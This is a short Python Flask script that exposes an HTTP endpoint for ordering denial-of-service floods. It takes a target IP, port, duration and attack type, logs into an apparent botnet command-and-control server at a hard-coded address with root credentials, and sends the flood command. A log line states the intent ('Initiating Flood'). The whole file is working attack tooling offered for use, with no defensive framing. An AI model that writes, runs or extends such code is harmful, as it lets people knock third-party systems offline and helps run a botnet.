import json
import socket
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

with open("commands.json", "r") as file:
    commands = json.load(file)

authorized_keys = ["testonly"]

@app.route('/api/raw', methods=['GET'])
def send_command():
    key = request.args.get('key')
    ip = request.args.get('ip')
    port = request.args.get('port')
    duration = request.args.get('time')
    command_name = request.args.get('command_name')

    if key not in authorized_keys:
        return jsonify({"error": "Unauthorized key"}), 401

    if command_name not in commands:
        return jsonify({"error": "Invalid command"}), 400

    command = commands[command_name].format(ip=ip, port=port, time=duration)

    try:
        print("Connecting To CNC And Initiating Flood")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('79.110.49.96', 5555))
        s.sendall(b'root\n')
        time.sleep(1)
        s.sendall(b'root\n')
        time.sleep(1)
        s.sendall(command.encode('ascii') + b'\n')
        time.sleep(1)
        s.close()

        return jsonify({'success': True})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=False, host='51.79.123.249', port=6969)